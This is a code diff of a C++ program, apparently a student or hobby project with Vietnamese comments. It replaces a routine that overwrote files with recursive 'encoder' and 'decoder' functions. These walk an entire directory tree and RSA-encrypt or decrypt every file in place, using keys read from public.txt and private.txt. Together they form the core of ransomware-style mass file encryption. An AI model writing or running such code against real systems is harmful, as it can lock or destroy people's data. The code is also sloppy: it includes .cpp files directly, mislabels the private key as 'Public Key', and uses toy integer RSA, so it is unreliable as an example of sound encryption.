@@ -3,6 +3,9 @@
 #include <vector>
 #include <string>
 #include <fstream>
+#include "keygen.cpp"
+#include "encrypt.cpp"
+#include "decrypt.cpp"
 
 namespace fs = std::filesystem;
 
@@ -10,6 +13,9 @@ struct FileItem {
     std::string name;
     bool isDirectory;
 };
+
+int e;
+int d;
 
 // Function to get a list of all files and directories in a specific path
 std::vector<FileItem> listFilesAndDirectories(const std::string& path) {
@@ -28,49 +34,81 @@ std::vector<FileItem> listFilesAndDirectories(const std::string& path) {
     return result;
 }
 
-// Function to read and print the content of a file
-// void readFileContent(const std::string& filePath) {
-//     std::ifstream file(filePath);
-//     if (file) {
-//         std::string line;
-//         while (std::getline(file, line)) {
-//             std::cout << line << std::endl;
-//         }
-//         file.close();
-//     } else {
-//         std::cerr << "Unable to open file: " << filePath << std::endl;
-//     }
-// }
-
-// Function to modify and save content of a file
-void modifyFileContent(const std::string& filePath, const std::string& content) {
-    std::ofstream outFile(filePath);
-    if (outFile) {
-        outFile << content;
-        outFile.close();
-    } else {
-        std::cerr << "Unable to open or create file: " << filePath << std::endl;
+void readPublicKeyFromFile() {
+    std::ifstream publicKeyFile("public.txt");
+    if (publicKeyFile.is_open()) {
+        publicKeyFile >> e;
+        publicKeyFile >> RSA::n;
+        publicKeyFile.close();
     }
+    std::cout << "Public Key: " << e << ", n: " << RSA::n << std::endl;
 }
 
-// Function to traverse and modify if it is a file
-void traverseAndModifyFiles(const std::vector<FileItem>& items, const std::string& currentPath, const std::string& content) {
+void encoder(const std::vector<FileItem>& items, const std::string& currentPath) {
     for (const auto& item : items) {
-        if (!item.isDirectory) {
-            modifyFileContent(currentPath + item.name, content); // Call function to modify file content
+        // In ra đường dẫn tuyệt đối của mỗi mục
+        std::string absolutePath = currentPath + item.name;
+        if (item.isDirectory) {
+            absolutePath += "\\";
+        }
+        //std::cout << (item.isDirectory ? "Directory: " : "File: ") << absolutePath << std::endl;
+
+        if (item.isDirectory) {
+            std::string newPath = absolutePath;
+            std::vector<FileItem> subItems = listFilesAndDirectories(newPath);
+            encoder(subItems, newPath);
+        }
+        else{
+            encrypt(absolutePath, e, RSA::n);
         }
     }
 }
 
-// Hàm main này dùng để test trực tiếp trong file, khi dùng bỏ note ra để dùng, content sẽ thay bằng đoạn mã hóa rsa.
+void readPrivateKeyFromFile() {
+    std::ifstream privateKeyFile("private.txt");
+    if (privateKeyFile.is_open()) {
+        privateKeyFile >> d;
+        privateKeyFile >> RSA::n;
+        privateKeyFile.close();
+    }
+    std::cout << "Public Key: " << d << ", n: " << RSA::n << std::endl;
+}
+
+// Function to traverse and decrypt if it is a file
+void decoder(const std::vector<FileItem>& items, const std::string& currentPath) {
+    for (const auto& item : items) {
+        // In ra đường dẫn tuyệt đối của mỗi mục
+        std::string absolutePath = currentPath + item.name;
+        if (item.isDirectory) {
+            absolutePath += "\\";
+        }
+        //std::cout << (item.isDirectory ? "Directory: " : "File: ") << absolutePath << std::endl;
+
+        if (item.isDirectory) {
+            std::string newPath = absolutePath;
+            std::vector<FileItem> subItems = listFilesAndDirectories(newPath);
+            decoder(subItems, newPath);
+        }
+        else{
+            decrypt(absolutePath, d, RSA::n);
+        }
+    }
+}
+
 // int main() {
+//     srand(time(NULL));
+//     RSA::primefiller();
+//     RSA::setkeys();
+    
 //     std::string path = "C:\\test\\";
 
-//     std::string content = "abcqsadjkdfghdafsdflsadljasljd";
-
 //     std::vector<FileItem> filesAndDirs = listFilesAndDirectories(path);
+    
+//     // readPublicKeyFromFile();
+//     // encoder(filesAndDirs, path);
 
-//     traverseAndModifyFiles(filesAndDirs, path, content);
+//     readPrivateKeyFromFile();
+//     decoder(filesAndDirs, path);
 
 //     return 0;
 // }
